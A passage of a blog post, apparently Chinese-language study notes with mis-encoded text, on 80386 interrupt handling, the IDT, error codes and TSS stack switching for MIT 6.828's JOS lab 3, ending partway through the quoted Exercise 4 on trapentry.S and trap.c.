æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ 80386 çš„ <code>lss</code> æŒ‡ä»¤</p><h4 id="Priority-Among-Simultaneous-Interrupts-and-Exceptions"><a href="#Priority-Among-Simultaneous-Interrupts-and-Exceptions" class="headerlink" title="Priority Among Simultaneous Interrupts and Exceptions"></a>Priority Among Simultaneous Interrupts and Exceptions</h4><p>ä¸­æ–­ä¸å¼‚å¸¸çš„å¤„ç†åŒæ ·æœ‰ç€ä¼˜å…ˆçº§ï¼Œå¤„ç†å™¨ä¼šå…ˆå¤„ç†é«˜ä¼˜å…ˆçº§çš„å¼‚å¸¸è€Œä¸¢å¼ƒä½ä¼˜å…ˆçº§çš„å¼‚å¸¸ï¼Œå½“ä¸­æ–­å¤„ç†è¿”å›æ—¶ä¼šå‘ç°è¢«ä¸¢å¼ƒçš„å¼‚å¸¸å¹¶é‡æ–°å¤„ç†ï¼›ä¼˜å…ˆçº§é¡ºåºå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Table 9-2. Priority Among Simultaneous Interrupts and Exceptions</span><br><span class="line"></span><br><span class="line">Priority   Class of Interrupt or Exception</span><br><span class="line"></span><br><span class="line">HIGHEST    Faults except debug faults</span><br><span class="line">Trap instructions INTO, INT n, INT 3</span><br><span class="line">Debug traps for this instruction</span><br><span class="line">Debug faults for next instruction</span><br><span class="line">NMI interrupt</span><br><span class="line">LOWEST     INTR interrupt</span><br></pre></td></tr></table></figure><h4 id="Interrupt-Descriptor-Table"><a href="#Interrupt-Descriptor-Table" class="headerlink" title="Interrupt Descriptor Table"></a>Interrupt Descriptor Table</h4><p>ç±»ä¼¼äºæ®µæè¿°ç¬¦è¡¨ï¼Œä¸­æ–­åŒæ ·æœ‰ç€å¯¹åº”çš„<strong>é—¨æè¿°ç¬¦</strong>ï¼ˆGate Descriptorï¼‰ç»“æ„ä¸ä¸€å¼ <strong>ä¸­æ–­æè¿°ç¬¦è¡¨</strong>ï¼ˆInterrupt Descriptor Tableï¼‰ï¼Œä¸åŒäº GDT ä¸ LDTï¼ŒIDT çš„ç¬¬ä¸€ä¸ªæè¿°ç¬¦æ˜¯å¯ç”¨çš„ï¼Œå› ä¸ºä¸­æ–­ä¸å¼‚å¸¸ä¸€å…±æœ‰ç€ 256 ä¸ªæ ‡å·ï¼Œå› æ­¤ä¸€å¼ ä¸­æ–­æè¿°ç¬¦è¡¨ä¸Šæœ€å¤šå¯ä»¥æœ‰ 256 ä¸ªä¸­æ–­æè¿°ç¬¦ï¼ˆä¹Ÿå¯ä»¥å°‘äºè¿™ä¸ªæ•°é‡ï¼‰</p><p>ä¸­æ–­æè¿°ç¬¦è¡¨çš„åœ°å€å­˜æ”¾åœ¨ IDT å¯„å­˜å™¨ï¼ˆIDTRï¼‰ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>lidt</code> æŒ‡ä»¤ï¼ˆé€šè¿‡çº¿æ€§åœ°å€è£…è½½ IDTï¼Œåªèƒ½åœ¨ 0 ç‰¹æƒçº§ä¸‹æ‰§è¡Œï¼‰ä¸ <code>sidt</code> æŒ‡ä»¤ï¼ˆæ‹·è´å½“å‰ IDTR çš„å€¼ï¼Œå¯ä»¥åœ¨ä»»ä½•ç‰¹æƒçº§ä¸‹æ‰§è¡Œï¼‰æ“ä½œ IDTR</p><p>ä¸­æ–­æè¿°ç¬¦è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/03/17/vPQKmeGVhyJ3ADT.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/17/5WujsrOYPpkMIze.png" alt="image.png"></p><h4 id="IDT-Descriptor"><a href="#IDT-Descriptor" class="headerlink" title="IDT Descriptor"></a>IDT Descriptor</h4><p>ä¸­æ–­æè¿°ç¬¦è¡¨ä¸­åŒ…å«å¦‚ä¸‹ä¸‰ç§æè¿°ç¬¦ï¼š</p><ul><li>ä»»åŠ¡é—¨ï¼ˆç”¨ä½œä»»åŠ¡åˆ‡æ¢ï¼Œåé¢å¯èƒ½ä¼šè®²åˆ°ï¼‰</li><li>ä¸­æ–­é—¨</li><li>é™·é˜±é—¨</li></ul><p>æè¿°ç¬¦çš„ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/17/Q3GiDPscdyKmLIT.png" alt="image.png"></p><h4 id="Interrupt-Procedures"><a href="#Interrupt-Procedures" class="headerlink" title="Interrupt Procedures"></a>Interrupt Procedures</h4><p>å¦‚åŒ call æŒ‡ä»¤ä¸€èˆ¬ï¼Œä¸­æ–­ä¸å¼‚å¸¸å…¶å®å°±æ˜¯â€œcallâ€ä¸­æ–­å¤„ç†ç¨‹åºâ€”â€”å¤„ç†å™¨é€šè¿‡ä¸­æ–­æˆ–å¼‚å¸¸æ ‡å·ä½œä¸º IDT çš„ç´¢å¼•æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦ï¼Œè‹¥æ˜¯ä¸€ä¸ªä¸­æ–­é—¨æˆ–é™·é˜±é—¨åˆ™å…¶ä¼šä»¥ç±»ä¼¼â€œcallâ€è°ƒç”¨é—¨çš„æ–¹å¼è°ƒç”¨å¤„ç†ç¨‹åºï¼Œè‹¥æ˜¯ä¸€ä¸ªä»»åŠ¡é—¨ï¼Œåˆ™ä¼šä»¥ç±»ä¼¼â€œcallâ€ä»»åŠ¡é—¨çš„æ–¹å¼å¼•èµ·ä»»åŠ¡åˆ‡æ¢</p><p>ä¸­æ–­é—¨ä¸é™·é˜±é—¨å¹¶ä¸ç›´æ¥æŒ‡å‘å¤„ç†ç¨‹åºï¼Œè€Œæ˜¯é€šè¿‡ä¸‹å›¾çš„æ–¹å¼æ‰¾åˆ°å¤„ç†ç¨‹åºåœ°å€ï¼šé—¨çš„é€‰æ‹©å­æŒ‡å‘ä¸€ä¸ª GDT&#x2F;LDT ä¸­çš„å¯æ‰§è¡Œæ®µï¼Œé—¨çš„ offset åŸŸæŒ‡å‘ä¸­æ–­&#x2F;å¼‚å¸¸å¤„ç†ç¨‹åºçš„å¼€å¤´</p><p><img src="https://s2.loli.net/2022/03/17/yoAXZpNmQDS3Vvr.png" alt="image.png"></p><p>å¦‚åŒ call æŒ‡ä»¤å¼•èµ·çš„æ§åˆ¶æµè½¬ç§»ä¸€èˆ¬ï¼Œä¸­æ–­ä¸å¼‚å¸¸çš„å¤„ç†è¿‡ç¨‹åŒæ ·ä½¿ç”¨å †æ ˆå­˜å‚¨è¿”å›åŸå§‹è¿‡ç¨‹æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨ iret æŒ‡ä»¤ä»æ ˆä¸Šæ¢å¤è¿™äº›ä¿¡æ¯ï¼Œå¦‚åŒä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/03/17/qWnwvs9NreXpuiD.png" alt="image.png"></p><p>åœ¨é€šè¿‡ä¸­æ–­é—¨æˆ–é™·é˜±é—¨åä¼šå°† eflags å­˜åˆ°æ ˆä¸Šï¼Œå¹¶é‡ç½® TF ï¼ˆtrap flagï¼‰æ ‡å¿—ä½ï¼Œä»¥æ­¤é˜²æ­¢å•æ­¥æ‰§è¡Œçš„è°ƒè¯•è¿‡ç¨‹å½±å“ä¸­æ–­å“åº”ï¼Œå®Œæˆå iret æŒ‡ä»¤ä¼šä»æ ˆä¸Šæ¢å¤ eflagsï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é€šè¿‡ä¸­æ–­é—¨åä¼šé‡ç½® IF ï¼Œä½†é€šè¿‡é™·é˜±é—¨å¹¶ä¸ä¼šé‡ç½® IF</p><p>åœ¨ä¸­æ–­è¿‡ç¨‹ä¸­ CPU ä¸å…è®¸å°†æ§åˆ¶æƒè½¬ç§»åˆ°ä½äºå½“å‰ç‰¹æƒçº§çš„æ®µä¸Šï¼Œå¦åˆ™ä¼šè§¦å‘ general protection faultï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»»ä¸€ä¸‹åˆ—ç­–ç•¥é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼š</p><ul><li>å°†å¤„ç†ç¨‹åºæ”¾åœ¨åˆé€‚çš„æ®µä¸­ï¼Œè¿™æ ·çš„ç­–ç•¥é€‚åˆä¸€äº›ç‰¹æ®Šçš„å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆä¾‹å¦‚ divided by zeroï¼‰ï¼Œè¿™æ ·çš„å¤„ç†ç¨‹åºå¿…é¡»ä»…ä½¿ç”¨å †æ ˆä¸­çš„å¯ç”¨æ•°æ®ï¼Œè‹¥å…¶éœ€è¦æ¥è‡ªæ•°æ®æ®µçš„æ•°æ®ï¼Œåˆ™éœ€è¦ç¡®ä¿æ•°æ®æ®µçš„ç‰¹æƒçº§ä¸º 3ï¼Œä»è€Œä½¿å…¶ä¸å—è®¿é—®ä¿æŠ¤</li><li>å°†å¤„ç†ç¨‹åºæ”¾åœ¨ç‰¹æƒçº§ 0 çš„æ®µä¸­</li></ul><h4 id="Interrupt-Tasks"><a href="#Interrupt-Tasks" class="headerlink" title="Interrupt Tasks"></a>Interrupt Tasks</h4><p>IDT ä¸­çš„ä»»åŠ¡é—¨å¹¶ä¸ç›´æ¥æŒ‡å‘ä¸€ä¸ªä»»åŠ¡ï¼Œå¦‚åŒä¸‹å›¾æ‰€ç¤ºï¼Œé—¨çš„é€‰æ‹©å­æŒ‡å‘ GDT ä¸­çš„ä¸€ä¸ª TSS æè¿°ç¬¦ï¼Œå½“ä¸­æ–­æˆ–å¼‚å¸¸è§¦å‘é€šè¿‡ä»»åŠ¡é—¨æ—¶ï¼Œå°†ä¼šè¿›è¡Œä»»åŠ¡çš„åˆ‡æ¢</p><p><img src="https://s2.loli.net/2022/03/17/GZBLwKDji6f7gdC.png" alt="image.png"></p><p>ä½¿ç”¨ä¸€ä¸ªç‹¬ç«‹çš„ä»»åŠ¡æ¥å¤„ç†ä¸­æ–­æœ‰å¦‚ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>ä¼šè‡ªåŠ¨ä¿å­˜è¿›ç¨‹ä¸Šä¸‹æ–‡</li><li>ä¸­æ–­å¤„ç†ç¨‹åºå¯ä»¥é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„åœ°å€ç©ºé—´ä¸å…¶ä»–ä»»åŠ¡ç‹¬ç«‹å¼€æ¥ï¼Œæ¯”å¦‚é€šè¿‡ä¸€ä¸ª LDT æˆ– ç‹¬ç«‹é¡µè¡¨</li></ul><p>ä»»åŠ¡çš„åˆ‡æ¢å‚è§ <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c07.htm">Chapter 7</a>.ï¼Œéœ€è¦è¯´æ˜çš„æ˜¯ä¸­æ–­ä»»åŠ¡åŒæ ·é€šè¿‡ iret æŒ‡ä»¤è¿”å›åŸè¿›ç¨‹ï¼›è‹¥æ˜¯ä»»åŠ¡åˆ‡æ¢æ˜¯ç”±ä¸€ä¸ªå¸¦ç€é”™è¯¯ä»£ç çš„å¼‚å¸¸å¼•èµ·çš„ï¼Œåˆ™å¤„ç†å™¨ä¼šè‡ªåŠ¨å°†é”™è¯¯ä»£ç å­˜åˆ°å¤„ç†ç¨‹åºçš„æ ˆä¸Š</p><p>åœ¨ 80386 ä¸­ä½¿ç”¨ä¸­æ–­ä»»åŠ¡æ—¶ï¼Œå®é™…ä¸Šæœ‰ä¸¤ä¸ªè°ƒåº¦å™¨ï¼šè½¯ä»¶è°ƒåº¦å™¨ï¼ˆOSçš„ä¸€éƒ¨åˆ†ï¼‰ä¸ç¡¬ä»¶è°ƒåº¦å™¨ï¼ˆå¤„ç†å™¨ä¸­æ–­æœºåˆ¶çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œè½¯ä»¶è°ƒåº¦å™¨çš„è®¾è®¡åº”è¯¥è€ƒè™‘åˆ°ç¡¬ä»¶è°ƒåº¦å™¨å¯ä»¥åœ¨å¯ç”¨ä¸­æ–­æ—¶è°ƒåº¦ä¸­æ–­ä»»åŠ¡è¿™ä¸€äº‹å®</p><h4 id="Interrupt-Summary"><a href="#Interrupt-Summary" class="headerlink" title="Interrupt Summary"></a>Interrupt Summary</h4><p>ä¸‹è¡¨æ€»ç»“äº† 386 æ‰€è¯†åˆ«çš„å¼‚å¸¸ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Table 9-6. Exception Summary</span><br><span class="line"></span><br><span class="line">Description               Interrupt   Return Address  Exception     Function That Can Generate</span><br><span class="line">Number      Points to       Type          the Exception</span><br><span class="line">Faulting</span><br><span class="line">Instruction</span><br><span class="line"></span><br><span class="line">Divide error               0          YES             FAULT         DIV, IDIV</span><br><span class="line">Debug exceptions           1</span><br><span class="line">Some debug exceptions are traps and some are faults.  The exception</span><br><span class="line">handler can determine which has occurred by examining DR6.  (Refer to Chapter 12.)</span><br><span class="line">Some debug exceptions are traps and some are faults.  The exception</span><br><span class="line">handler can determine which has occurred by examining DR6.  (Refer to Chapter 12.) Any instruction</span><br><span class="line">Breakpoint                 3          NO              TRAP          One-byte INT 3</span><br><span class="line">Overflow                   4          NO              TRAP          INTO</span><br><span class="line">Bounds check               5          YES             FAULT         BOUND</span><br><span class="line">Invalid opcode             6          YES             FAULT         Any illegal instruction</span><br><span class="line">Coprocessor not available  7          YES             FAULT         ESC, WAIT</span><br><span class="line">Double fault               8          YES             ABORT         Any instruction that can</span><br><span class="line">generate an exception</span><br><span class="line">Coprocessor Segment</span><br><span class="line">Overrun                    9          NO              ABORT         Any operand of an ESC</span><br><span class="line">instruction that wraps around</span><br><span class="line">the end of a segment.</span><br><span class="line">Invalid TSS               10          YES             FAULT</span><br><span class="line">An invalid-TSS fault is not restartable if it occurs during the</span><br><span class="line">processing of an external interrupt.        JMP, CALL, IRET, any interrupt</span><br><span class="line">Segment not present       11          YES             FAULT         Any segment-register modifier</span><br><span class="line">Stack exception           12          YES             FAULT         Any memory reference thru SS</span><br><span class="line">General Protection        13          YES             FAULT/ABORT</span><br><span class="line">All GP faults are restartable. If the fault occurs while attempting to</span><br><span class="line">vector to the handler for an external interrupt, the interrupted program is</span><br><span class="line">restartable, but the interrupt may be lost.  Any memory reference or code</span><br><span class="line">fetch</span><br><span class="line">Page fault                14          YES             FAULT         Any memory reference or code</span><br><span class="line">fetch</span><br><span class="line">Coprocessor error         16          YES             FAULT</span><br><span class="line">Coprocessor errors are reported as a fault on the first ESC or WAIT</span><br><span class="line">instruction executed after the ESC instruction that caused the error.        ESC, WAIT</span><br><span class="line">Two-byte SW Interrupt     0-255       NO              TRAP          INT n</span><br></pre></td></tr></table></figure><blockquote><p>è¯¦ç»†è¯´æ˜å‚è§ <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm</a></p></blockquote><h4 id="Error-Code"><a href="#Error-Code" class="headerlink" title="Error Code"></a>Error Code</h4><p>è‹¥å¼‚å¸¸ä¸ä¸€ä¸ªç‰¹å®šçš„æ®µç›¸å…³è”ï¼Œåˆ™å¤„ç†å™¨ä¼šå°†ä¸€ä¸ªé”™è¯¯ä»£ç å­˜åˆ°å¼‚å¸¸å¤„ç†ç¨‹åºçš„æ ˆä¸Šï¼Œæ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/17/zTLnsmHUW2RVYue.png" alt="image.png"></p><p>åœ¨é”™è¯¯ä»£ç ä¸­å¹¶ä¸åŒ…å«ç‰¹æƒçº§å­—æ®µï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ä¸¤ä¸ªæ–°çš„ä½ï¼š</p><ul><li>EXT bitï¼šç¨‹åºå¤–éƒ¨çš„äº‹ä»¶é€ æˆäº†å¼‚å¸¸</li><li>I-bitï¼ˆIDT-bitï¼‰ï¼šé”™è¯¯ä»£ç çš„ index å­—æ®µå¼•ç”¨ IDT ä¸­çš„é—¨æè¿°ç¬¦</li></ul><p>è‹¥æœªè®¾ç½® I-bitï¼Œåˆ™ TI ä½æŒ‡ç¤ºé”™è¯¯ä»£ç å¼•ç”¨ GDTï¼ˆ0ï¼‰è¿˜æ˜¯ LDTï¼ˆ1ï¼‰ï¼Œå‰©ä¸‹çš„ 14 ä½ä¸ºæ®µé€‰æ‹©å­çš„é«˜ 14 ä½</p><p>ä¸‹è¡¨æ€»ç»“äº†å¼‚å¸¸ä¸­çš„é”™è¯¯ä»£ç ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Description                       Interrupt     Error Code</span><br><span class="line">Number</span><br><span class="line"></span><br><span class="line">Divide error                       0            No</span><br><span class="line">Debug exceptions                   1            No</span><br><span class="line">Breakpoint                         3            No</span><br><span class="line">Overflow                           4            No</span><br><span class="line">Bounds check                       5            No</span><br><span class="line">Invalid opcode                     6            No</span><br><span class="line">Coprocessor not available          7            No</span><br><span class="line">System error                       8            Yes (always 0)</span><br><span class="line">Coprocessor Segment Overrun        9            No</span><br><span class="line">Invalid TSS                       10            Yes</span><br><span class="line">Segment not present               11            Yes</span><br><span class="line">Stack exception                   12            Yes</span><br><span class="line">General protection fault          13            Yes</span><br><span class="line">Page fault                        14            Yes</span><br><span class="line">Coprocessor error                 16            No</span><br><span class="line">Two-byte SW interrupt             0-255         No</span><br></pre></td></tr></table></figure><h3 id="Basics-of-Protected-Control-Transfer"><a href="#Basics-of-Protected-Control-Transfer" class="headerlink" title="Basics of Protected Control Transfer"></a>Basics of Protected Control Transfer</h3><p>å¼‚å¸¸ä¸ä¸­æ–­éƒ½æ˜¯â€œè¢«ä¿æŠ¤çš„æ§åˆ¶æµåˆ‡æ¢â€â€”â€”å°†å¤„ç†å™¨åˆ‡æ¢è‡³å†…æ ¸æ€ï¼ˆCPL&#x3D;0ï¼‰ï¼Œä¸”ä¸ä¼šç»™ç”¨æˆ·æ€ä»£ç å½±å“å†…æ ¸æˆ–å…¶ä»–ç¯å¢ƒçš„æœºä¼š</p><p>åœ¨ Intel æœ¯è¯­ä¸­ï¼Œä¸€ä¸ªä¸­æ–­é€šå¸¸æ˜¯ç”±å¤„ç†å™¨å¤–éƒ¨çš„å¼‚æ­¥äº‹ä»¶è§¦å‘çš„ï¼Œä¾‹å¦‚å¤–è®¾çš„ I&#x2F;Oï¼›è€Œå¼‚å¸¸åˆ™æ˜¯ç”±å½“å‰è¿è¡Œçš„ä»£ç åŒæ­¥è§¦å‘çš„äº‹ä»¶ï¼Œä¾‹å¦‚éæ³•å†…å­˜è®¿é—®</p><p>ä¸ºäº†ç¡®ä¿ä¸­æ–­ä¸å¼‚å¸¸â€œçœŸæ­£å—åˆ°ä¿æŠ¤â€ï¼Œå…¶è¢«è®¾è®¡ä¸ºï¼šè§¦å‘å…¶çš„ä»£ç åªèƒ½åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¿›å…¥å†…æ ¸çš„ç‰¹å®šä½ç½®ï¼Œé€šè¿‡ä»¥ä¸‹ä¸¤ç§æœºåˆ¶ï¼š</p><ul><li><strong>ä¸­æ–­æè¿°ç¬¦è¡¨</strong>ï¼šå¤„ç†å™¨ç¡®ä¿ä¸­æ–­ä¸å¼‚å¸¸åªèƒ½é€šè¿‡ç‰¹å®šçš„å…¥å£ç‚¹è¿›å…¥å†…æ ¸ï¼Œè¿™ä¾¿æ˜¯ä¸­æ–­æè¿°ç¬¦è¡¨ä¸­çš„ã€Œé—¨ã€ç»“æ„ï¼Œx86å…è®¸å¤šè¾¾ 256 ä¸ªä¸åŒçš„å…¥å£ç‚¹â€”â€”å¯¹åº” 256 ä¸ªä¸­æ–­æè¿°ç¬¦è¡¨ç´¢å¼•ï¼Œå¤„ç†å™¨ä»è¯¥è¡¨ä¸­å¯¹åº”æ¡ç›®åŠ è½½ï¼š<ul><li>eipï¼šå¼‚å¸¸å¤„ç†ç¨‹åºä»£ç åœ°å€</li><li>csï¼šä»£ç æ®µé€‰æ‹©å­ï¼Œåœ¨å…¶ 0 ~ 1 ä½ä¸­åŒ…å«è¿è¡Œå¼‚å¸¸å¤„ç†ç¨‹åºçš„ç‰¹æƒçº§ï¼ˆåœ¨ JOS ä¸­æ‰€æœ‰å¼‚å¸¸éƒ½åœ¨ 0 ç‰¹æƒçº§ä¸‹å¤„ç†ï¼‰</li></ul></li><li><strong>ä»»åŠ¡çŠ¶æ€æ®µ</strong>ï¼šå¤„ç†å™¨éœ€è¦ä¸€ä¸ªåœ°æ–¹æ¥ä¿å­˜ä¸­æ–­å‘ç”Ÿå‰çš„ä¸Šä¸‹æ–‡ï¼Œä»¥ä¾¿åœ¨å®Œæˆå¤„ç†åæ¢å¤ä¸Šä¸‹æ–‡ï¼Œä½†è¿™ä¸ªåŒºåŸŸä¸åº”å½“è¢«ç”¨æˆ·è¿›ç¨‹è®¿é—®ï¼Œä¸­æ–­å¤„ç†éœ€è¦é™·å…¥å†…æ ¸ï¼Œäºæ˜¯ä¹Ÿéœ€è¦ç‹¬ç«‹çš„å†…æ ¸å †æ ˆï¼Œå› æ­¤<strong>ä»»åŠ¡çŠ¶æ€æ®µ</strong>ï¼ˆTSSï¼‰ç»“æ„æŒ‡å®šäº†å†…æ ¸å †æ ˆçš„åœ°å€ä¸æ®µé€‰æ‹©å­ï¼Œå¤„ç†å™¨å°†æ—§çš„ ssã€espã€eflagsã€csã€eipã€ï¼ˆå¯é€‰ï¼‰error code å‹åˆ°å†…æ ¸æ ˆä¸Šï¼Œä»ä¸­æ–­æè¿°ç¬¦ä¸­åŠ è½½ cs ä¸ eipï¼Œå¹¶è®¾ç½® <code>ss:esp</code> ä»¥å¼•ç”¨æ–°çš„å †æ ˆ</li></ul><p>æˆ‘ä»¬åœ¨ JOS ä¸­ TSS ä»…ç”¨æ¥å®šä¹‰ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æ—¶åº”åˆ‡æ¢åˆ°çš„å†…æ ¸å †æ ˆï¼Œä¸ä½¿ç”¨å…¶ä»–å­—æ®µ</p><h3 id="Types-of-Exceptions-and-Interrupts"><a href="#Types-of-Exceptions-and-Interrupts" class="headerlink" title="Types of Exceptions and Interrupts"></a>Types of Exceptions and Interrupts</h3><p><del>è¯´è¿‡äº†.jpg</del></p><p>æœ¬èŠ‚æˆ‘ä»¬å°†æ‰©å±• JOS çš„ 0 ~31 å·å¼‚å¸¸å‘é‡ï¼Œä¸‹ä¸€å±Šæˆ‘ä»¬å°†æ‰©å±•è½¯ä¸­æ–­ï¼ˆ0x30ï¼‰ä½œä¸º JOS çš„ç³»ç»Ÿè°ƒç”¨å…¥å£ç‚¹ï¼Œåœ¨ lab4 ä¸­æˆ‘ä»¬å°†æ‰©å±• JOS ä»¥è®©å…¶å¤„ç†ç¡¬ä»¶ä¸­æ–­ï¼ˆä¾‹å¦‚æ—¶é’Ÿä¸­æ–­ï¼‰</p><h3 id="An-Example"><a href="#An-Example" class="headerlink" title="An Example"></a>An Example</h3><p><del>æ‡’å¾—çœ‹ï¼Œåæ­£å°±é‚£å›äº‹</del></p><h3 id="Nested-Exceptions-and-Interrupts"><a href="#Nested-Exceptions-and-Interrupts" class="headerlink" title="Nested Exceptions and Interrupts"></a>Nested Exceptions and Interrupts</h3><p>å¯¹äºå†…æ ¸ä¸­çš„åµŒå¥—ä¸­æ–­è€Œè¨€ä¸éœ€è¦é‡å¤åˆ‡æ¢å†…æ ¸å †æ ˆï¼Œåªéœ€è¦ä¿å­˜æ—§çš„ä¸Šä¸‹æ–‡åˆ°å†…æ ¸å †æ ˆä¸Šå³å¯</p><h3 id="Setting-Up-the-IDT"><a href="#Setting-Up-the-IDT" class="headerlink" title="Setting Up the IDT"></a>Setting Up the IDT</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†è®¾ç½® IDT çš„ 0~31 å·ä¸­æ–­å‘é‡ï¼Œéšåæˆ‘ä»¬ä¼šè®¾ç½®ç³»ç»Ÿè°ƒç”¨ä¸­æ–­çš„å¤„ç†ç¨‹åºï¼Œåœ¨åé¢çš„ lab ä¸­è®¾ç½® 32 ~ 47 å·ä¸­æ–­ï¼ˆè®¾å¤‡ä¸­æ–­ï¼‰</p><p>æˆ‘ä»¬åº”å½“å®ç°å¦‚ä¸‹æ‰€ç¤ºæ§åˆ¶æµç¨‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">      IDT                   trapentry.S         trap.c</span><br><span class="line">   </span><br><span class="line">+----------------+                        </span><br><span class="line">|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)</span><br><span class="line">|                |             // do stuff      &#123;</span><br><span class="line">|                |             call trap          // handle the exception/interrupt</span><br><span class="line">|                |             // ...           &#125;</span><br><span class="line">+----------------+</span><br><span class="line">|   &amp;handler2    |--------&gt; handler2:</span><br><span class="line">|                |            // do stuff</span><br><span class="line">|                |            call trap</span><br><span class="line">|                |            // ...</span><br><span class="line">+----------------+</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">+----------------+</span><br><span class="line">|   &amp;handlerX    |--------&gt; handlerX:</span><br><span class="line">|                |             // do stuff</span><br><span class="line">|                |             call trap</span><br><span class="line">|                |             // ...</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ªå¼‚å¸¸æˆ–ä¸­æ–­éƒ½åº”åœ¨ <code>trapentry.S</code> ä¸­æœ‰å…¶è‡ªå·±çš„ handlerï¼Œè€Œ <code>trap_init()</code> åº”å½“åˆå§‹åŒ–è¿™äº› handlerï¼Œæ¯ä¸ª handler åº”å½“åœ¨æ ˆä¸Šå»ºç«‹ä¸€ä¸ª <code>struct Trapframe</code>ï¼ˆå‚è§ <code>inc/trap.h</code>ï¼‰å¹¶å°†å…¶æŒ‡é’ˆä½œä¸ºå‚æ•°è°ƒç”¨ <code>trap()</code>ï¼Œç”±å…¶å¯¹åº”è°ƒç”¨åˆ°ç›¸åº”çš„å¤„ç†å‡½æ•°</p><p>è¡¥å……äº†é‚£ä¹ˆå¤šçš„åŸºç¡€çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥æ˜¯ Exercise 4â€”â€”ç¼–è¾‘ <code>trapentry.S</code> ä¸ <code>trap.c</code> å®ç°ä¸­æ–­ä¸å¼‚å¸¸å¤„ç†</p><blockquote><p><strong>Exercise 4.</strong> Edit <code>trapentry.S</code> and <code>trap.c</code> and implement the features described above. The macros <code>TRAPHANDLER</code> and <code>TRAPHANDLER_NOEC</code> in <code>trapentry.S</code> should help you, as well as the T_* defines in <code>inc/trap.h</code>. You will need to add an entry point in <code>trapentry.S</code> (using those macros) for each trap defined in <code>inc/trap.h</code>, and youâ€™ll have to provide <code>_alltraps</code> which the <code>TRAPHANDLER</code> macros refer to. You will also need to modify <code>trap_init()</code> to initialize the <code>idt</code> to point to each of these entry points defined in <code>trapentry.S</code>; the <code>SETGATE</code> macro will be helpful here.</p><p>Your <code>_alltraps</code> should:</p><ol><li>push values to make the stack look like a struct Trapframe</li><li>load <code>GD_KD</code> into <code>%ds</code> and <code>%es</code></li><li><code>pushl %esp</code> to pass a pointer to the Trapframe as an argument to trap()</li><li><code>call trap</code> (can <code>trap</code> ever return?)</li></ol><p>Consider using the <code>pushal</code> instruction; it fits nicely with the layout of the <code>struct Trapframe</code>.</p><p>Test your trap handling code using some of the test programs in the <code>user</code> directory that cause exceptions before making any system calls, such as <code>user/divzero</code>. You should be 